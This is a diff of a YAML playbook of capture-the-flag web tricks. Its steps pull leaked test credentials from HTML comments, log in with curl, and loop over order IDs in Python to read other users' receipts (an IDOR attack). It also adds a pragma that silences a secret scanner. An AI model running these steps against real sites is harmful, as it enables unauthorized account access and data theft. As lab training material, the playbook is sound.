@@ -15,13 +15,14 @@ tricks:
       curl -s http://TARGET/ | grep -i '<!--'
       # Found: <!-- TODO: Delete the testing account (test:test). -->
 
+  # pragma: allowlist secret
   - name: "Step 2: Login with default credentials"
     when: "Found credentials in comments"
     how: "Submit username first, then password on redirect page"
     payload: |
       # Submit username
       curl -c cookies.txt -d 'username=test' http://TARGET/
-      
+
       # Submit password (two-step login)
       curl -b cookies.txt -c cookies.txt -d 'password=test' http://TARGET/password/test
 
@@ -37,10 +38,10 @@ tricks:
     how: "Iterate through ID range to find other users' orders"
     payload: |
       import requests
-      
+
       s = requests.Session()
       # ... login first ...
-      
+
       for id in range(300000, 301000):
           resp = s.get(f'http://TARGET/order/{id}/receipt')
           if 'FLAG{' in resp.text:
@@ -54,4 +55,3 @@ tricks:
     payload: |
       curl -b cookies.txt http://TARGET/order/300401/receipt
       # FLAG{...}
-
